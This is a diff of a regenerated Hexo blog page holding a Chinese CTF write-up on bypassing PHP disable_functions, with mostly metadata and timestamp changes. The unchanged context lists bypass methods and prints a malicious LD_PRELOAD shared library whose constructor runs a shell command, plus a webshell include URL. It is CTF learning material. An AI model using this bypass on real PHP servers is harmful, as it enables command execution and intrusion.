@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
 <meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.2.0">
+<meta name="generator" content="Hexo 5.4.2">
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
@@ -35,8 +35,8 @@
 <meta property="og:image" content="https://sunian19.github.io/imgss/u68.png">
 <meta property="og:image" content="https://sunian19.github.io/imgss/u69.png">
 <meta property="og:image" content="https://sunian19.github.io/imgss/u70.png">
-<meta property="article:published_time" content="2020-03-13T13:24:41.000Z">
-<meta property="article:modified_time" content="2022-09-29T02:46:57.244Z">
+<meta property="article:published_time" content="2020-03-14T04:24:41.000Z">
+<meta property="article:modified_time" content="2024-01-18T16:56:03.440Z">
 <meta property="article:author" content="zer0_c|imb">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="disabled_functions">
@@ -160,7 +160,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ti-mu-kao-dian"><span class="nav-number">1.</span> <span class="nav-text">题目考点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jie-ti-si-lu"><span class="nav-number">2.</span> <span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#kai-shi-jie-ti"><span class="nav-number">3.</span> <span class="nav-text">开始解题</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E8%80%83%E7%82%B9"><span class="nav-number">1.</span> <span class="nav-text">题目考点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">2.</span> <span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E8%A7%A3%E9%A2%98"><span class="nav-number">3.</span> <span class="nav-text">开始解题</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -175,7 +175,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">94</span>
+          <span class="site-state-item-count">98</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -186,7 +186,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">39</span>
+        <span class="site-state-item-count">40</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -278,14 +278,14 @@
       </span>
       <span class="post-meta-item-text">发表于</span>
 
-      <time title="创建时间：2020-03-13 21:24:41" itemprop="dateCreated datePublished" datetime="2020-03-13T21:24:41+08:00">2020-03-13</time>
+      <time title="创建时间：2020-03-13 21:24:41" itemprop="dateCreated datePublished" datetime="2020-03-13T21:24:41-07:00">2020-03-13</time>
     </span>
       <span class="post-meta-item">
         <span class="post-meta-item-icon">
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2022-09-29 10:46:57" itemprop="dateModified" datetime="2022-09-29T10:46:57+08:00">2022-09-29</time>
+        <time title="修改时间：2024-01-18 08:56:03" itemprop="dateModified" datetime="2024-01-18T08:56:03-08:00">2024-01-18</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -315,10 +315,10 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="ti-mu-kao-dian" id="题目考点">题目考点</h2>
+        <h2 id="题目考点">题目考点</h2>
 <p>PHP Bypass disabled_functions</p>
-<a id="more"></a>
-<h2 id="jie-ti-si-lu" id="解题思路">解题思路</h2>
+<span id="more"></span>
+<h2 id="解题思路">解题思路</h2>
 <p>1、有四种绕过 disable_functions 的手法：</p>
 <ul>
 <li>第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；</li>
@@ -340,7 +340,7 @@
 LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p>
 <p>(2)、putenv<br>
 函数说明：putenv()用来改变或增加环境变量的内容. 参数string 的格式为name＝value, 如果该环境变量原先存在, 则变量内容会依参数string 改变, 否则此参数内容会成为新的环境变量.</p>
-<h2 id="kai-shi-jie-ti" id="开始解题">开始解题</h2>
+<h2 id="开始解题">开始解题</h2>
 <p>我们先生成一个hack.c恶意动态链接库文件</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void angel (void)&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    system(&quot;&#x2F;readflag &gt; &#x2F;tmp&#x2F;sunian&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 <p><img src="/imgss/u63.png" alt=""><br>
@@ -410,7 +410,7 @@ url/?ant=include(%27sunian.php%27);<br>
 
 <div class="copyright">
   &copy; 
-  <span itemprop="copyrightYear">2022</span>
+  <span itemprop="copyrightYear">2024</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
